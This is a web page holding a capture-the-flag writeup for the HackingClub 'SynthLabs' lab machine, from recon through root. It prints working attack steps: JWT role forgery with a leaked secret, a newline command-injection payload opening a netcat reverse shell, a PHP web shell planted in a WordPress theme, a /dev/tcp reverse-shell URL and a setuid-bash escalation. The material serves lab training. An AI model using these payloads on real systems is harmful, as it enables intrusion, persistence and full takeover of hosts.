@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>[HC] SynthLabs - ribeir.in</title>
+    <link rel="stylesheet" href="../../css/style.css">
+</head>
+<body>
+    <div class="container">
+        <div data-component="header" data-base-path="../../"></div>
+
+        <main>
+            <article class="content">
+                <h1>[HackingClub] SynthLabs Writeup</h1>
+                
+                <div class="box-info">
+                    <table>
+                        <tr>
+                            <td>Platform:</td>
+                            <td>HackingClub</td>
+                        </tr>
+                        <tr>
+                            <td>Machine:</td>
+                            <td>SynthLabs</td>
+                        </tr>
+                        <tr>
+                            <td>Category:</td>
+                            <td>Web Exploitation</td>
+                        </tr>
+                        <tr>
+                            <td>OS:</td>
+                            <td>Linux</td>
+                        </tr>
+                        <tr>
+                            <td>Difficulty:</td>
+                            <td><span class="difficulty medium">Medium</span></td>
+                        </tr>
+                    </table>
+                </div>
+
+                <div class="tags" style="margin-bottom: 30px;">
+                    <span class="tag">git exposed</span>
+                    <span class="tag">jwt</span>
+                    <span class="tag">command injection</span>
+                    <span class="tag">wordpress</span>
+                </div>
+
+                <img src="../../images/hackingclub/synthlabs/index.png" alt="SynthLabs Machine" style="max-width: 100%; margin-bottom: 20px;">
+
+                <h2>## Recon</h2>
+                
+                <p>At the beginning, I used <code>nmap</code> with the following parameters to scan the target.</p>
+
+                <pre><code>┌─[ribeirin@parrot]─[~/Documents/machines/hackingclub/synthlab]
+└──╼ $sudo nmap -sSVC -Pn -T5 --min-rate 2000 -p- 172.16.0.210
+Nmap scan report for 172.16.0.210
+Host is up (0.15s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 19:91:a6:2e:17:d4:98:d7:68:68:e8:d3:88:e5:e9:62 (ECDSA)
+|_  256 77:7f:8a:01:61:1e:b1:c3:30:aa:d1:1d:77:23:b8:37 (ED25519)
+80/tcp open  http    nginx 1.24.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://synthlabs.hc/
+|_http-server-header: nginx/1.24.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
+
+                <p>The scan revealed only ports 22 (SSH) and 80 (HTTP) as open. Also we need add <code>synthlabs.hc</code> in <code>/etc/hosts</code>.</p>
+
+                <p>First, I performed fuzzing on the web application using <code>ffuf</code> to discover hidden directories and files:</p>
+
+                <pre><code>/.git
+/api/user - GET
+/api/auth/login - POST
+/api/auth/register - POST
+/api/admin - GET
+/api/admin/git - POST</code></pre>
+
+                <p>We can observe that a Git repository is exposed, so we can use <code>git-dumper</code> to extract its contents. Inside the repository, we find a <code>.env</code> file that contains:</p>
+
+                <pre><code>SECRET=zqe%]BJmwPZGGGN&amp;S%yGT%3{z/3)Nq_a@$@
+PORT=3000
+DOJO_URL=http://localhost:8080
+TOKEN_DOJO=28f538e6b2f27e342e494e5fd7e837246aa7f19b</code></pre>
+
+                <h2>## Exploitation</h2>
+                
+                <p>We can observe that there is an API and a DefectDojo instance, but they are not directly accessible to us. So, the first step is to understand the web application.</p>
+
+                <p>Initially, we create a user at <code>/api/auth/register</code>.</p>
+                <img src="../../images/hackingclub/synthlabs/user_created.png" alt="User Created" style="max-width: 100%; margin: 20px 0;">
+
+                <p>Then, we log in at <code>/api/auth/login</code>. The login returns a JWT token.</p>
+                <img src="../../images/hackingclub/synthlabs/user_login.png" alt="User Login" style="max-width: 100%; margin: 20px 0;">
+
+                <p>JWT structure:</p>
+                <pre><code>Header
+{
+  "alg": "HS256",
+  "typ": "JWT"
+}
+
+Payload
+{
+  "userId": "7a88f17e-a6e9-4651-b9aa-26311affbcfd",
+  "role": "user",
+  "iat": 1747499875,
+  "exp": 1747503475
+}</code></pre>
+
+                <p>With the secret obtained from the <code>.env</code> file, we can try to modify the "role" claim to "admin". In this case, we successfully change it, and by testing the <code>/api/admin</code> endpoint, we are authorized as an admin.</p>
+                <img src="../../images/hackingclub/synthlabs/change_role_jwt.png" alt="Change Role JWT" style="max-width: 100%; margin: 20px 0;">
+
+                <p>At the <code>/api/admin/git</code> endpoint, we can send a POST request with the <code>repository</code> parameter set to "test". Notice that it returns a "Git command execution failed" message. It seems there is a command injection vulnerability in this parameter.</p>
+                <img src="../../images/hackingclub/synthlabs/code_injection_poc1.png" alt="Code Injection POC" style="max-width: 100%; margin: 20px 0;">
+
+                <p>By testing some bypass techniques such as <code>$(whoami)</code>, <code>;ls;</code>, <code>|| ls ||</code>, among others, we can observe that the application returns:</p>
+                <pre><code>{"message":"Dangerous characters blocked!"}</code></pre>
+
+                <p>After some time, we discovered that by using <code>\n</code>, we can bypass the restriction. This allows us to get a reverse shell with the following payload:</p>
+
+                <pre><code>POST /api/admin/git HTTP/1.1
+Host: synthlabs.hc
+Content-Type: application/json
+Content-Length: 64
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
+
+{"repository":"t\nbusybox nc 10.0.10.235 4444 -e sh\nsleep(13)"}</code></pre>
+
+                <h2>## Post Exploitation</h2>
+                
+                <p>By inspecting the processes with <code>pspy</code>, we see that the root user (UID 0) is running the <code>backup.sh</code> script. If we modify this file, we can perform privilege escalation.</p>
+
+                <pre><code>2025/02/23 00:41:01 CMD: UID=0     PID=175636 | /bin/bash /var/www/synthlabs-blog/backup.sh</code></pre>
+
+                <p>We do not have permission to modify this file; only the <code>www-data</code> user does.</p>
+
+                <pre><code>thiago@ip-172-16-0-210:/home/thiago/synthlabs/src$ ls -la /var/www/synthlabs-blog/backup.sh
+-rwxr-xr-x 1 www-data root 308 Feb 22 05:44 /var/www/synthlabs-blog/backup.sh</code></pre>
+
+                <p>Checking the internal ports with <code>ss -tlnp</code>, we see port 8000 (WordPress) is listening internally.</p>
+
+                <p>We will use the tool <code>chisel</code> for tunneling.</p>
+
+                <p><strong>Attacker machine:</strong></p>
+                <pre><code>./chisel server -p 12312 --reverse</code></pre>
+
+                <p><strong>Target machine:</strong></p>
+                <pre><code>/tmp/tools/chisel client 10.0.10.235:12312 R:8000:127.0.0.1:8000</code></pre>
+
+                <p>Still on the machine as the user <code>thiago</code> with the "admin" role, we will create a WordPress user by using the <code>wp-load.php</code> file:</p>
+
+                <pre><code>&lt;?php
+define('WP_USE_THEMES', false);
+require_once('/var/www/synthlabs-blog/wp-load.php');
+
+$user = 'ribeirin';
+$pass = 'ribeirin@hc';
+$email = 'ribeirin@hc.com';
+
+if (!username_exists($user) &amp;&amp; !email_exists($email)) {
+    $user_id = wp_create_user($user, $pass, $email);
+    $user = new WP_User($user_id);
+    $user-&gt;set_role('administrator');
+    echo "User created";
+} else {
+    echo "Error";
+}
+?&gt;</code></pre> 
+
+                <p>Now, just run <code>php /tmp/adduser.php</code>.</p>
+
+                <p>An alternative way to create an account is to generate a hash and directly replace the admin password in the database using the credentials from <code>wp-config.php</code>.</p>
+
+                <p>To execute a reverse shell in WordPress, we can modify the <code>functions.php</code> file in the theme (I will modify the twentytwentyfive theme) to achieve RCE. We need to keep only the payload in the <code>functions.php</code> file (this may cause communication errors).</p>
+
+                <p>In the "Theme File Editor" (<code>http://localhost:8000/wp-admin/theme-editor.php</code>), select the "Twenty Twenty Five" theme. In the "Theme Files" section, click on <code>functions.php</code>, delete everything and insert a PHP payload:</p>
+
+                <pre><code>&lt;?php system($_GET['cmd']); ?&gt;</code></pre>
+
+                <p>Now, simply access the file and include a payload to get a reverse shell:</p>
+
+                <pre><code>http://localhost:8000/wp-content/themes/twentytwentyfive/functions.php?cmd=%2Fbin%2Fbash%20-c%20%27sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.0.10.235%2F4455%200%3E%261%27</code></pre>
+
+                <p>Now, just modify <code>backup.sh</code> and add the privilege escalation payload: <code>chmod u+s /bin/bash</code>.</p>
+
+                <pre><code>www-data@ip-172-16-2-127:/var/www/synthlabs-blog$ /bin/bash -p
+bash-5.2# whoami
+root
+
+bash-5.2# id
+uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)</code></pre>
+
+                <div class="article-eof">
+                    <div class="eof-line">─────────────────────────────────────</div>
+                    <div class="eof-title">HackingClub // SynthLabs</div>
+                    <div class="eof-author">ribeir.in</div>
+                    <div class="eof-line">─────────────────────────────────────</div>
+                </div>
+            </article>
+
+            <div style="margin-top: 30px; padding-top: 20px; border-top: 1px dashed var(--text-dim);">
+                <a href="../../writeups.html">&lt;&lt; Back to Writeups</a>
+            </div>
+        </main>
+
+        <div data-component="footer" data-base-path="../../"></div>
+    </div>
+
+    <script src="../../js/main.js"></script>
+</body>
+</html>
